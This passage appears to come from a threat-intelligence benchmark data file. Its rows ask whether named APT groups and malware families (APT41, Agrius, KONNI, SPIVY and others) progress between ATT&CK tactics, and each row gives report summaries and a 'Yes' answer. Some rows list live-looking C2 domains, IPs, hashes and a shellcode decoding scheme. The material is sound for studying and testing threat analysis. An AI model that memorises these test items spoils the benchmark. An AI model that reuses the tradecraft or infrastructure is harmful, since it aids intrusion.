Execution: The web directory from the C2 server contained PHP files responsible for controlling communications with infected systems. The PHP files included checks to determine whether to proceed with standard operations or redirect to the legitimate Piriform website. The PHP script contained references to the required table for information storage within the 'x.php' variables. The 'init.php' file defined core variables and operations, specifying 'PRC' as the time zone and the database configuration to use. The PHP script compared the system beaconing to the C2 to three values: $DomainList, $IPList, and $HostList, to determine if the infected system should be delivered a Stage 2 payload. The attackers controlled which infected systems were delivered a Stage 2 payload, with 20 unique hosts identified as affected.
Discovery: The PHP script gathered information from infected systems, including OS version, architecture, administrative rights, hostname, and domain name. The system profile information was aggressive, including a list of installed software and all current running processes. The system profile information was stored in the MySQL database. The attackers used this reconnaissance information to determine which machines to target in the final stages of the campaign.
Others: The stage 2 installer, GeeSetup_x86.dll, checked the OS version and dropped either a 32-bit or 64-bit version of a trojanized tool. The x86 version used a trojanized TSMSISrv.dll, while the x64 version dropped a trojanized EFACli64.dll. The setup put an encoded PE in the registry, which was executed by the trojanized files. The stage 3 payload reached out to additional C2 servers and executed in-memory PE files. A lightweight backdoor module in the registry retrieved an IP from data steganographically hidden in a GitHub or WordPress search, from which an additional PE module was downloaded and run. Talos reviewed claims of code overlap with malware samples known to be used by Group 72, confirming the overlap. The attack was sophisticated, targeting technology companies through a supply chain attack to compromise a large number of victims persistently, in hopes to land payloads on computers at specific target networks. Indicators of compromise associated with the attack were provided.",Yes,CCleaner_C2
2914,97,97-Discovery-T1049-System Network Connections Discovery,"After executing checks on the infected systems to determine whether to deliver a Stage 2 payload, is it likely that the PHP script will perform aggressive system profiling and gather information from infected systems before storing the reconnaissance results in the MySQL database?","Discovery: The PHP script gathered information from infected systems, including OS version, architecture, administrative rights, hostname, and domain name. The system profile information was aggressive, including a list of installed software and all current running processes. The system profile information was stored in the MySQL database. The attackers used this reconnaissance information to determine which machines to target in the final stages of the campaign.","Initial Access: Talos recently published a technical analysis of a backdoor which was included with version 5.33 of the CCleaner application. During the investigation, an archive containing files from the C2 server was provided, which included web server configuration files and a MySQL database reflecting research activity. The attackers targeted specific organizations, including Cisco, through the delivery of a second-stage loader. The C2 tracking database indicated that at least 20 victim machines were served specialized secondary payloads.
Execution: The web directory from the C2 server contained PHP files responsible for controlling communications with infected systems. The PHP files included checks to determine whether to proceed with standard operations or redirect to the legitimate Piriform website. The PHP script contained references to the required table for information storage within the 'x.php' variables. The 'init.php' file defined core variables and operations, specifying 'PRC' as the time zone and the database configuration to use. The PHP script compared the system beaconing to the C2 to three values: $DomainList, $IPList, and $HostList, to determine if the infected system should be delivered a Stage 2 payload. The attackers controlled which infected systems were delivered a Stage 2 payload, with 20 unique hosts identified as affected.
Command and Control: The C2 MySQL database contained two tables: one describing all machines that reported to the server and one describing all machines that received the second-stage download. Over 700,000 machines reported to the C2 server, and more than 20 machines received the second-stage payload. The attackers could add or remove domains at any time, based on the environments or organizations they chose to target.
Others: The stage 2 installer, GeeSetup_x86.dll, checked the OS version and dropped either a 32-bit or 64-bit version of a trojanized tool. The x86 version used a trojanized TSMSISrv.dll, while the x64 version dropped a trojanized EFACli64.dll. The setup put an encoded PE in the registry, which was executed by the trojanized files. The stage 3 payload reached out to additional C2 servers and executed in-memory PE files. A lightweight backdoor module in the registry retrieved an IP from data steganographically hidden in a GitHub or WordPress search, from which an additional PE module was downloaded and run. Talos reviewed claims of code overlap with malware samples known to be used by Group 72, confirming the overlap. The attack was sophisticated, targeting technology companies through a supply chain attack to compromise a large number of victims persistently, in hopes to land payloads on computers at specific target networks. Indicators of compromise associated with the attack were provided.",Yes,CCleaner_C2
2915,98,98-Initial Access-T1566-Phishing,"Prior to utilizing spear-phishing emails to gain initial access, is it likely that APT41 conducts reconnaissance activities such as targeting call record information at telecom companies and hotel reservation systems?","Initial Access: APT41 has utilized spear-phishing emails with attachments, such as compiled HTML (.chm) files, to initially compromise victim organizations.","Reconnaissance: APT41 has conducted reconnaissance activities, targeting call record information at telecom companies and hotel reservation systems, particularly ahead of Chinese officials' stays, suggesting tasks to reconnoiter facilities for security reasons.
Execution: APT41 deploys a variety of malware, including backdoors, credential stealers, keyloggers, and rootkits, to execute their operations within compromised systems.
Persistence: APT41 has deployed rootkits and Master Boot Record (MBR) bootkits to maintain persistence on select victim systems, with bootkits adding stealth by executing before the operating system initializes.
Defense Evasion: APT41 uses bootkits for defense evasion, which are executed prior to the operating system initializing, adding an extra layer of stealth.
Credential Access: APT41 uses malware such as credential stealers and keyloggers to access credentials within compromised systems.
Discovery: APT41 is adept at moving laterally within networks, including pivoting between Windows and Linux systems, to discover and access game production environments.
Lateral Movement: APT41 moves laterally within targeted networks, including pivoting between Windows and Linux systems, until accessing game production environments.
Collection: APT41 collects source code and digital certificates from game production environments.
Impact: APT41 manipulates virtual currencies and has attempted to deploy ransomware in the video game industry for financial gain.
Others: APT41 is a Chinese cyber threat group involved in state-sponsored espionage and financially motivated operations since 2014. They are known for supply chain compromise tactics, limiting malware deployment to specific systems, and using non-public malware typically reserved for espionage in financially motivated activities. APT41's malware arsenal includes over 46 different families and tools, and they have been linked to Chinese espionage contractors advertising their services online. The group's activities suggest a blurred line between state power and crime.",Yes,blog_APT41
2920,98,98-Credential Access-T1056-Input Capture,"After deploying malware like backdoors and rootkits for execution within compromised systems, is it likely that APT41 will use keyloggers and credential stealers to achieve credential access before discovering and moving laterally within networks to access game production environments?",Credential Access: APT41 uses malware such as credential stealers and keyloggers to access credentials within compromised systems.,"Reconnaissance: APT41 has conducted reconnaissance activities, targeting call record information at telecom companies and hotel reservation systems, particularly ahead of Chinese officials' stays, suggesting tasks to reconnoiter facilities for security reasons.
Initial Access: APT41 has utilized spear-phishing emails with attachments, such as compiled HTML (.chm) files, to initially compromise victim organizations.
Execution: APT41 deploys a variety of malware, including backdoors, credential stealers, keyloggers, and rootkits, to execute their operations within compromised systems.
Persistence: APT41 has deployed rootkits and Master Boot Record (MBR) bootkits to maintain persistence on select victim systems, with bootkits adding stealth by executing before the operating system initializes.
Defense Evasion: APT41 uses bootkits for defense evasion, which are executed prior to the operating system initializing, adding an extra layer of stealth.
Discovery: APT41 is adept at moving laterally within networks, including pivoting between Windows and Linux systems, to discover and access game production environments.
Lateral Movement: APT41 moves laterally within targeted networks, including pivoting between Windows and Linux systems, until accessing game production environments.
Collection: APT41 collects source code and digital certificates from game production environments.
Impact: APT41 manipulates virtual currencies and has attempted to deploy ransomware in the video game industry for financial gain.
Others: APT41 is a Chinese cyber threat group involved in state-sponsored espionage and financially motivated operations since 2014. They are known for supply chain compromise tactics, limiting malware deployment to specific systems, and using non-public malware typically reserved for espionage in financially motivated activities. APT41's malware arsenal includes over 46 different families and tools, and they have been linked to Chinese espionage contractors advertising their services online. The group's activities suggest a blurred line between state power and crime.",Yes,blog_APT41
11,10,10-Initial Access-T1190-Exploit Public-Facing Application,"After being observed leveraging CVE-2015-2545 for Initial Access with weaponized documents, is SPIVY likely to use a search order hijacking technique via ssMUIDLL.dll for the Execution phase before employing a modified network communication protocol to evade detection during the Defense Evasion phase?","Initial Access: Unit 42 observed a new variant of Poison Ivy, named SPIVY, being deployed via weaponized documents leveraging CVE-2015-2545. The documents were themed around recent Hong Kong pro-democracy events. The exploit drops a self-extracting RAR containing three files: a legitimate executable (RasTls.exe) for side-loading the malware DLL (ssMUIDLL.dll), and an encoded shellcode Poison Ivy backdoor (samsung.hlp).","Execution: The SPIVY variant of Poison Ivy uses a search order hijacking technique, also known as 'DLL Sideloading', similar to malware like PlugX. The Poison Ivy builder allows output as either a PE file or shellcode. In this case, the backdoor was built as shellcode and then obfuscated to prevent detection. The encoded shellcode is decoded with a single byte addition of 0x99, XOR with 0xD4, then subtract 0x33. The decoded shellcode is launched by ssMUIDLL.dll.
Defense Evasion: SPIVY uses a modified network communication protocol to help evade detection. Unlike previous versions of Poison Ivy which utilize a fixed 256 byte challenge-response handshake, SPIVY generates a payload with 1 to 16 bytes of pseudo-random data plus control bytes, where the 1st byte indicates the length of the padding before the handshake. The remainder of the protocol remains unchanged.
Command and Control: Two C2 domains were identified: sent.leeh0m[.]org and found.leeh0m[.]org, both third-level domains off of leeh0m[.]org, created in late February 2016. Unit 42 observed two configurations with SHA256 hashes 9c6dc1c2ea5b2370b58b0ac11fde8287cd49aee3e089dbdf589cc8d51c1f7a9e and 4d38d4ee5b625e09b61a253a52eb29fcf9c506ee9329b3a90a0b3911e59174f2, both using password 'bqesid#@', C2 port 443, and mutex '40EM76iR9'.
Others: The decoy documents associated with SPIVY reference specific events and organizations related to the Hong Kong pro-democracy movement. One decoy is from Joshua Wong, announcing a press conference about ending the Scholarism group to start a political party, Demosistō. Another concerns the Mong Kok riot, purporting to be from the Justice & Peace Commission of the Hong Kong Catholic Diocese. The final decoy is an invitation to a wreath laying event by the Hong Kong Alliance in Support of Patriotic Democratic Movements of China, commemorating the Tiananmen Square massacre.",Yes,unit42-new-poison-ivy-rat-variant-targets-hong-kong-pro-democracy-activists
18,101,101-Persistence-T1053-Scheduled Task/Job,"After ""Machete"" gains initial access through spear-phishing emails and fake blog websites that distribute self-extracting archives disguised as PowerPoint presentations, is it likely that the malware will begin logging keystrokes, capturing microphone audio, and taking screenshots to collect sensitive information after achieving persistence through the creation of tasks like 'Microsoft_up'?","Persistence: On infected machines, ""Machete"" creates a file named 'Java Update.lnk' pointing to 'appdata/Jre6/java.exe' and installs the malware in 'appdata/ MicroDes/'. It also creates a task named 'Microsoft_up'.","Initial Access: The malware known as ""Machete"" is distributed through social engineering tactics, including spear-phishing emails and a fake blog website. No evidence suggests the use of exploits targeting zero-day vulnerabilities. The attackers and victims are both Spanish-speaking. The malware is embedded in PowerPoint presentations disguised as Nullsoft Installer self-extracting archives with names such as 'Hermosa XXX.pps.rar', 'Suntzu.rar', 'El arte de la guerra.rar', and 'Hot brazilian XXX.rar'. These files, when opened, install the malware on the target system.
Collection: ""Machete"" is capable of logging keystrokes, capturing audio from the computer's microphone, taking screenshots, capturing geolocation data, taking photos from the computer's web camera, copying files to a remote server, copying files to a special USB device if inserted, and hijacking the clipboard to capture information from the target machine.
Others: The campaign, believed to have started in 2010 and renewed in 2012, may still be active. Victims are primarily located in Venezuela, Ecuador, Colombia, Peru, Russia, Cuba, and Spain, and include high-profile targets such as intelligence services, military, embassies, and government institutions. The malware uses Python embedded into Windows executables, which is unusual and suggests ease of coding rather than multi-platform support. Infrastructure for Mac OS X and Unix victims, as well as a mobile (Android) component, were also discovered. Indicators of Compromise include suspicious domains like 'java.serveblog.net', 'agaliarept.com', and others, as well as a known infection artifact 'hxxp://name.domain.org/nickname/set/Signed_Update.jar'. Malicious samples related to this attack are detected by Kaspersky Lab products as Trojan-Spy.Python.Ragua.",Yes,El_Machete
19,101,101-Collection-T1056-Input Capture,"After achieving persistence by creating a task named 'Microsoft_up' and installing the malware in 'appdata/MicroDes/', is ""Machete"" likely to log keystrokes and copy files to a special USB device for collection of sensitive information?","Collection: ""Machete"" is capable of logging keystrokes, capturing audio from the computer's microphone, taking screenshots, capturing geolocation data, taking photos from the computer's web camera, copying files to a remote server, copying files to a special USB device if inserted, and hijacking the clipboard to capture information from the target machine.","Initial Access: The malware known as ""Machete"" is distributed through social engineering tactics, including spear-phishing emails and a fake blog website. No evidence suggests the use of exploits targeting zero-day vulnerabilities. The attackers and victims are both Spanish-speaking. The malware is embedded in PowerPoint presentations disguised as Nullsoft Installer self-extracting archives with names such as 'Hermosa XXX.pps.rar', 'Suntzu.rar', 'El arte de la guerra.rar', and 'Hot brazilian XXX.rar'. These files, when opened, install the malware on the target system.
Persistence: On infected machines, ""Machete"" creates a file named 'Java Update.lnk' pointing to 'appdata/Jre6/java.exe' and installs the malware in 'appdata/ MicroDes/'. It also creates a task named 'Microsoft_up'.
Others: The campaign, believed to have started in 2010 and renewed in 2012, may still be active. Victims are primarily located in Venezuela, Ecuador, Colombia, Peru, Russia, Cuba, and Spain, and include high-profile targets such as intelligence services, military, embassies, and government institutions. The malware uses Python embedded into Windows executables, which is unusual and suggests ease of coding rather than multi-platform support. Infrastructure for Mac OS X and Unix victims, as well as a mobile (Android) component, were also discovered. Indicators of Compromise include suspicious domains like 'java.serveblog.net', 'agaliarept.com', and others, as well as a known infection artifact 'hxxp://name.domain.org/nickname/set/Signed_Update.jar'. Malicious samples related to this attack are detected by Kaspersky Lab products as Trojan-Spy.Python.Ragua.",Yes,El_Machete
40,103,103-Credential Access-T1555-Credentials from Password Stores,"Following the execution of arbitrary code by the KONNI malware, is it likely that the malware will achieve persistence on the victim's system through means like Windows shortcuts or fake binary files before stealing credentials from browsers such as Firefox, Chrome, and Opera?","Credential Access: The malware is capable of stealing keystrokes and credentials from browsers such as Firefox, Chrome, and Opera.","Initial Access: Throughout the multiple campaigns observed over the last 3 years, the actor has used an email attachment as the initial infection vector. They then use additional social engineering to prompt the target to open a .src file, display a decoy document to the users, and finally execute the malware on the victim's machine.
Execution: The current version of the malware allows the operator to execute arbitrary code on the infected host.
Persistence: In the 2014 campaign, the malware dropped two files on the targeted system: a decoy document and a fake svchost.exe binary, both stored in ""C:\Windows"". In the 2016 campaign, the malware was dropped in the local setting of the current user and a shortcut was created to launch winnit.exe in the startup folder. In the 2017 campaigns, persistence was achieved by a Windows shortcut named adobe distillist.lnk.
Defense Evasion: The malware has evolved over time, moving from a single file to a dual file structure (an executable and a dynamic library), and the decoy documents have become more advanced. The malware checks if a file used on a previous version of KONNI is available on the system.
Collection: The malware is designed to steal files, keystrokes, and perform screenshots.
Command and Control: The malware communicates with command and control (C2) domains using HTTP connections. The C2 infrastructure was hosted by a free web hosting provider, 000webhost. The malware samples connected to a specific URI: <c2-domain>/login.php. Over time, more .php files became available for registration, uploading, and downloading files.
Exfiltration: The malware uploads stolen data, such as keystrokes and screenshots, to the C2 infrastructure.
Others: The malware, named KONNI, has been under the radar for over 3 years, authored by Paul Rascagneres from Talos. It has been used in multiple campaigns targeting public organizations, with decoy documents suggesting links to North Korea. The malware's capabilities and infrastructure have evolved, including the use of free web hosting providers for C2 and the addition of remote administration features. The latest campaigns from April 2017 are still active, and the infrastructure remains operational. The malware's evolution shows technical advancements and improved decoy documents containing potentially sensitive data.",Yes,konni-malware-under-radar-for-years.html
46,104,104-Initial Access-T1566-Phishing,Is it likely that the observed campaign involving phishing emails will execute VBS macros from the embedded Microsoft Word document after gaining initial access through phishing emails containing the malicious 'Richard_Johnson.doc' file?,"Initial Access: The initial access to the target systems was achieved through phishing emails containing a Microsoft Word document with embedded VBS macros. The document, named 'Richard_Johnson.doc', was one of approximately 180 variants identified by Carbon Black, with differences primarily in metadata and junk data within the macros. The document's metadata indicated that the campaign's documents were first saved on December 17, 2018, and continued to be updated until January 21, 2019.","Reconnaissance: The Carbon Black ThreatSight team observed a campaign involving phishing emails with attached Word documents containing embedded macros. These emails were designed to deliver Ursnif malware and GandCrab ransomware upon successful execution. The campaign utilized various techniques favored by red teamers, espionage-focused adversaries, and large-scale criminal campaigns.
Execution: Upon opening the malicious Word document, a VBS macro would execute, calling a shape box in the document to retrieve and run an encoded PowerShell script. This script would then download and execute payloads associated with both Ursnif and GandCrab malware.
Defense Evasion: The PowerShell script executed by the macro would operate in memory, avoiding detection by not writing to the disk. It used the .Net Webclient class to download payloads and leveraged the DCOM object C08AFD90-F2A1-11D1-8455-00A0C91F3880 to execute the downloaded files without saving them to disk.
Command and Control: The PowerShell script communicated with hardcoded command and control (C2) servers to request and download the payloads. The script would first attempt to use the DownloadString method to contact the C2 server and then the DownloadData method to download a resource from a second C2 server.
Impact: The payloads downloaded and executed by the PowerShell script were GandCrab ransomware and Ursnif malware. GandCrab, a variant of version 5.0.4, would encrypt files on the compromised system, while Ursnif would perform actions such as credential harvesting, gathering system and process information, and potentially deploying additional malware.
Others: The campaign was analyzed using VirusTotal Graph, which organized the variants into groups commonly associated by metadata or document structures. The analysis highlighted at least three different variants of Ursnif hosted on the bevendbrec[.]com site, as well as the PowerShell cradle and PS Empire script used to inject the Gandcrab sample into memory. Carbon Black's Threat Analysis Unit released this report to aid researchers and security practitioners in combating the campaign, as new samples were being discovered daily.",Yes,GandCrab and Ursnif Campaign
65,106,106-Exfiltration-T1041-Exfiltration Over C2 Channel,"After collecting information from compromised hosts using UltraVNC.ini and Ultra VNC Server, is it likely that ScarCruft will exfiltrate data to the attackers' infrastructure using specific PHP scripts such as '/kcp/cfg/cat/hp/proc.php' and BITSAdmin for transferring malware to victims' systems?","Exfiltration: The exfiltration process involved sending data from compromised hosts to the attackers' infrastructure. Specific PHP scripts such as '/kcp/cfg/cat/hp/proc.php' were used to exfiltrate data. Additionally, the attackers used BITSAdmin to transfer malware to the victims' systems, as indicated by the command line used for the operation.","Initial Access: The ScarCruft group, also known as APT 37, Group123, Ricochet Chollima, and Venus121, targeted journalists, North Korean defectors, and government officials. They employed phishing emails with links to download Office documents containing decoy content. Upon clicking the link and downloading the document, the host system would be compromised, and an Office Macro Script would be loaded to facilitate further malicious activities.
Execution: The execution phase involved the use of Office Macro Scripts to load the Chinotto malware onto the compromised host systems. Additionally, PowerShell and Golang malware were used alongside BITSAdmin for DLL Side-Loading to execute malicious scripts and establish command and control.
Defense Evasion: The ScarCruft group utilized DLL Side-Loading techniques for defense evasion. They loaded the Chinotto malware using evc.dll and employed mfc42u.dll as a loader to execute the malware without detection.
Collection: The group collected information from compromised hosts and exfiltrated data to their command and control servers. The compromised host analysis revealed the use of UltraVNC.ini and Ultra VNC Server for information collection, indicating the presence of mobile infostealer malware and command and control capabilities developed in Golang (ably).
Command and Control: ScarCruft established command and control channels using HTTP requests to specific PHP scripts on their C2 servers. They also used Golang malware to communicate with the attacker's channel, sending commands and receiving command results through an Ably key and Client Hello messages.
Others: The report includes the concept of 'Defend Forward,' developed by the US Department of Defense to proactively disrupt or stop malicious cyber activities at an early stage and increase the cost to adversaries. This approach involves an aggressive defensive mindset, identifying victims, incident response, and takedown of distribution sites. The incident response process includes malware analysis, investigation, C2 monitoring, threat tracking, identification of additional victims, blocking command and control and download sites, and developing countermeasures to prevent recurrence.",Yes,ScarCruft (APT37) active in South Korea
66,107,107-Initial Access-T1078-Valid Accounts,"After the attacker employs multi-layer obfuscation techniques and leverages or compromises a Westnet user account to achieve initial access, is it likely that the Adwind RAT will execute multiple levels of JAR extractions and create a parent Java process that further operates in the victim's system?","Initial Access: A new campaign spreading the Adwind RAT has been observed, specifically targeting the petroleum industry in the US. The campaign utilizes multi-layer obfuscation to evade detection, with multiple RAT samples hosted on the serving domain 'members[.]westnet[.]com[.]au/~joeven/'. The attacker has either used or compromised a Westnet user account to host the RAT. The payload is executed by the victim, involving multiple levels of JAR extractions.","Execution: The Adwind RAT executes a dropped JAR payload, which creates a parent Java process and copies itself into the %User% directory. It then performs three actions: executes the copy, creates a registry entry in HKCU/CurrentVersion/Run for persistence, and creates WMI scripts in %temp% to disable firewall and antivirus services. Subsequent JARs perform AES decryption routines and execute as new Java threads, leading to the loading of the JRAT class responsible for major RAT functionality.
Persistence: The Adwind RAT achieves persistence through registry modifications, specifically by creating a registry entry in HKCU/CurrentVersion/Run.
Defense Evasion: The Adwind RAT employs multi-layer obfuscation techniques, including the use of multiple embedded JAR archives before unpacking the actual payload. It also uses WMI scripts to disable firewall and antivirus services. The RAT's obfuscation techniques have been successful in evading detection, as indicated by low VirusTotal detection ratios.
Collection: The RAT's core functionalities include capturing webcam images, scanning the hard-drive for files based on extensions defined in the RAT's config, spinning up multiple process threads, and performing injection into known legitimate Windows processes.
Command and Control: The JRAT class within the Adwind RAT tries connecting to its command and control server at the IP address 185[.]205[.]210[.]48. It encrypts and exfiltrates data to this server.
Exfiltration: The Adwind RAT encrypts and exfiltrates data to its command and control server.
Others: The URLs hosting the Adwind RAT were reported to Westnet on September 9th, 2019. The VirusTotal detection ratio for the top-level JAR was 5/56, while that of the final decrypted JAR was 49/58. The campaign has been active over the last couple of years, with the RAT supporting cross-platform functionality for Windows, Linux, and Mac.",Yes,New Adwind Campaign targets US Petroleum Industry
81,109,109-Command and Control-T1105-Ingress Tool Transfer,"After infiltrating the target internal network through the use of a USB worm to evade physical isolation, is OnionDog likely to establish communication with a C&C server and download other malware using the OnionDog Trojan for further operations?","Command and Control: When the OnionDog Trojan is successfully released, it will communicate to a C&C (Trojan server), download other malware and save them in the %temp% folder and use ""XXX_YYY.jpg"" uniformly as the file name. These names have their special meaning and usually point to the target.","Initial Access: OnionDog malware is transmitted by taking advantage of the vulnerability of the popular office software Hangul in Korean-language countries, and it attacked network-isolated targets through a USB Worm. In addition, OnionDog also used darkweb (""Onion City"") communications tools, with which it can visit the domain without the Onion browser, making its real identity hidden in the completely anonymous Tor network.
Defense Evasion: Since most infrastructure industries, such as the energy industry, generally adopt intranet isolation measures, OnionDog uses the USB disk drive ferry to break the false sense of security of physical isolation. In the classic APT case of the Stuxnet virus, which broke into an Iranian nuclear power plant, the virus used an employee's USB disk to circumvent network isolation. OnionDog also used this channel and generated USB worms to infiltrate the target internal network.
Others: The Helios Team at 360 SkyEye Labs recently revealed that a hacker group named OnionDog has been infiltrating and stealing information from the energy, transportation and other infrastructure industries of Korean-language countries through the Internet. According to big data correlation analysis, OnionDog's first activity can be traced back to October, 2013 and in the following two years it was only active between late July and early September. The self-set lifecycle of a Trojan attack is 15 days on average and is distinctly organizational and objective-oriented. OnionDog concentrated its efforts on infrastructure industries in Korean-language countries. In 2015 this organization mainly attacked harbors, VTS, subways, public transportation and other transportation systems. In 2014 it attacked many electric power and water resources corporations as well as other energy enterprises. 360's Threat Intelligence Center has found 96 groups of malicious code, 14 C&C domain names and IP related to OnionDog. It first surfaced in October 2013, and then was most active in the summers of the following years. The Trojan set its own ""active state"" time and the shortest was be three days and maximum twenty nine days, from compilation to the end of activity. The average life cycle is 15 days, which makes it more difficult for the victim enterprises to notice and take actions than those active for longer period of time. In 2014, OnionDog used many fixed IPs in South Korea as its C&C sites. Of course, this does not mean that the attacker is located in South Korea. These IPs could be used as puppets and jumping boards. By 2015, OnionDog website communications were upgraded to Onion City across the board. This is so far a relatively more advanced and covert method of network communication among APT hacker attacks. Onion City means that the deep web searching engine uses Tor2web agent technology to visit the anonymous Tor network deeply without using the Onion Brower specifically. And OnionDog uses the Onion City to hide the Trojan-controlling server in the Tor network. In recent years, APT attacks on infrastructure facilities and large-scale enterprises have frequently emerged. Some that attack an industrial control system, such as Stuxnet, Black Energy and so on, can have devastating results. Some attacks are for the purpose of stealing information, such as the Lazarus hacker organization jointly revealed by Kaspersky, AlienVault lab and Novetta, and OnionDog which was recently exposed by the 360 Helios team. These secret cybercrimes can cause similarly serious losses as well. In view of OnionDog's pattern of activity, we are likely to observe a new round of attacks this summer. The relevant threat intelligence and technical analysis report will be updated by 360's Intelligence Center(https://ti.360.com).",Yes,onion-dog-a-3-year-old-apt
95,110,110-Command and Control-T1071-Application Layer Protocol,"After exploiting CVE-2017-11882 via an RTF document to drop an HTA file and using WMI to check for installed antivirus software before executing the FinalBot backdoor with DLL sideloading for defense evasion, is it likely that the HTA file will communicate with the C2 server and leverage webserv-redir.net for Command and Control?",Command and Control: The HTA file communicated with the C2 server to send information about the installed antivirus software. The domain used for C2 communication was webserv-redir.net.,"Initial Access: APT Sidewinder exploited CVE-2017-11882 using an RTF document to download an HTA file from the domain webserv-redir.net. The HTA file, avoiding PowerShell to remain undetected, checked for installed antivirus software using WMI and communicated with the C2 server.
Execution: The HTA file contained within the RTF document executed a script that stopped if certain antivirus software was detected. If not detected, it proceeded to run a backdoor named FinalBot.exe, which was extracted from a zip file and renamed to Srvstr.exe in the directory. The backdoor was developed in VB and utilized a modified msvbvm60.dll, renamed to 8EBECD7C.dll.
Persistence: The backdoor established persistence by creating a Run key in the registry: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\WinSrv.
Defense Evasion: Sidewinder's HTA file avoided using PowerShell, which is commonly monitored, and instead used VBS. The backdoor also employed a technique called DLL sideloading, using cmpbk32.dll to execute Srvstr.exe.
Discovery: The HTA file used WMI to discover installed antivirus products on the victim's system.
Others: Indicators of compromise (IOCs) associated with the Sidewinder campaign include various hashes for files such as Test.Zip, FinalBot.exe, hj1.txt, hj.txt, and the domain webserv-redir.net with its associated IP address 185.106.120.43. Additional related domains include heartissuehigh.win, mail.webserv-redir.net, and www.webserv-redir.net. An RTF document was also identified as an IOC with the URL hxxp://www.webserv-redir.net/images/67381F0B/-1/5272/3cdc4fcb/main.RTF.",Yes,APT Sidewinder changes theirs TTPs to install their backdoor
111,113,113-Collection-T1113-Screen Capture,"Before DYMALLOY and ALLANITE take screenshots as part of their collection tactics, is it likely that ALLANITE will create user accounts and engage in credential harvesting to maintain persistence after initially gaining access through phishing with document attachments?","Collection: Dragonfly 2.0's impact on Industrial Control Systems (ICS) involved OPC-focused malware, while DYMALLOY and ALLANITE conducted surveys and took screenshots via malware and system tools, respectively, as part of their collection tactics.","Initial Access: The CTI report indicates that the Dragonfly 2.0 group was active from 2013 to 2014, targeting Europe and North America. Their infection vector included phishing with PDF attachments, watering holes, and trojanized software. DYMALLOY, active since late 2015, has targeted Turkey, Europe, and North America using phishing with document attachments. ALLANITE, active from mid-2017, has targeted the USA, UK, and Germany with phishing using document attachments and watering holes.
Persistence: The report details that Dragonfly 2.0 utilized KARAGANY malware for persistence, while DYMALLOY and ALLANITE employed various malware and backdoors. ALLANITE also created user accounts and engaged in credential harvesting for maintaining persistence.
Credential Access: ALLANITE's persistence techniques included creating user accounts and credential harvesting, indicating their methods for accessing credentials.
Impact: The report describes the impact of Dragonfly 2.0's activities, which involved OPC-focused malware. DYMALLOY and ALLANITE's activities included surveys and screenshots, which could be indicative of their impact on the targeted systems.
Others: The CTI report by Sergio Caltagirone and Joe Slowik from Dragos.com introduces the concept of Activity Groups as a framework for analyzing and mitigating cyber threats. Activity Groups are defined by similarities in features or processes and are weighted by confidence. They are dynamic and change over time to incorporate new knowledge about adversaries. The report emphasizes that Activity Groups are not static and must be updated to maintain accuracy. The creation of an Activity Group involves selecting features, classifying events, and analyzing the groups to address specific analytic problems. The report also discusses the challenges of naming and correlating activities across different organizations due to the complexity of classification and the need for a shared grouping function and feature vector.",Yes,dragosactivitygroupswebinarfinal-190122171111
120,114,114-Lateral Movement-T1021-Remote Services,"After achieving persistence by registering the 'IPsec Helper' backdoor as a service and deploying webshells, is Agrius likely to leverage compromised accounts and use offensive security tools for lateral movement within the target network?",Lateral Movement: Agrius used webshells to tunnel RDP traffic and leverage compromised accounts for lateral movement within the target network. The group utilized a variety of publicly available offensive security tools for credential harvesting and lateral movement.,"Initial Access: Agrius' primary method for gaining initial access involved exploiting public-facing applications, likely using publicly available exploits. The group attempted to exploit FortiOS CVE-2018-13379 against Israeli targets and also tried various 1-day vulnerabilities and SQL injection. Successful exploitation led to the uploading of webshells for lateral movement using RDP.
Execution: Agrius deployed custom malware, including a .NET backdoor named 'IPsec Helper', which was used to exfiltrate data or deploy additional malware. This backdoor was registered as a service for persistence and could execute commands, upload files, and update its configuration based on commands from C2 servers.
Persistence: Agrius achieved persistence by deploying webshells and registering its custom backdoor 'IPsec Helper' as a service on compromised systems.
Defense Evasion: Agrius used webshells with variations of ASPXSpy, some of which were obfuscated with a custom base64 encoding function unique to the group. The backdoor 'IPsec Helper' contained functionality to update its engine and delete traces of itself to evade defenses.
Command and Control: The 'IPsec Helper' backdoor communicated with C2 servers over HTTP, based on a configuration file containing encrypted server addresses. The malware awaited commands from these relays, which included updating relays, sending recon information, downloading files, and self-deletion.
Impact: Agrius deployed wipers, including 'Apostle' and DEADWOOD, to destroy data on targeted systems. Initially, 'Apostle' was a wiper that failed to execute properly due to a logic flaw but was later turned into functioning ransomware. DEADWOOD was used to overwrite files with random data and could be executed in service or Windows application mode, with various functionalities to prevent user access and ensure proper execution.",Yes,evol-agrius
122,114,114-Lateral Movement-T1550-Use Alternate Authentication Material,"After exploiting public-facing applications to gain initial access via vulnerabilities like CVE-2018-13379, is Agrius likely to use webshells for tunneling RDP traffic and leverage compromised accounts for lateral movement before communicating with C2 servers using the 'IPsec Helper' backdoor over HTTP?",Lateral Movement: Agrius used webshells to tunnel RDP traffic and leverage compromised accounts for lateral movement within the target network. The group utilized a variety of publicly available offensive security tools for credential harvesting and lateral movement.,"Initial Access: Agrius' primary method for gaining initial access involved exploiting public-facing applications, likely using publicly available exploits. The group attempted to exploit FortiOS CVE-2018-13379 against Israeli targets and also tried various 1-day vulnerabilities and SQL injection. Successful exploitation led to the uploading of webshells for lateral movement using RDP.
Execution: Agrius deployed custom malware, including a .NET backdoor named 'IPsec Helper', which was used to exfiltrate data or deploy additional malware. This backdoor was registered as a service for persistence and could execute commands, upload files, and update its configuration based on commands from C2 servers.
Persistence: Agrius achieved persistence by deploying webshells and registering its custom backdoor 'IPsec Helper' as a service on compromised systems.
Defense Evasion: Agrius used webshells with variations of ASPXSpy, some of which were obfuscated with a custom base64 encoding function unique to the group. The backdoor 'IPsec Helper' contained functionality to update its engine and delete traces of itself to evade defenses.
Command and Control: The 'IPsec Helper' backdoor communicated with C2 servers over HTTP, based on a configuration file containing encrypted server addresses. The malware awaited commands from these relays, which included updating relays, sending recon information, downloading files, and self-deletion.
Impact: Agrius deployed wipers, including 'Apostle' and DEADWOOD, to destroy data on targeted systems. Initially, 'Apostle' was a wiper that failed to execute properly due to a logic flaw but was later turned into functioning ransomware. DEADWOOD was used to overwrite files with random data and could be executed in service or Windows application mode, with various functionalities to prevent user access and ensure proper execution.",Yes,evol-agrius
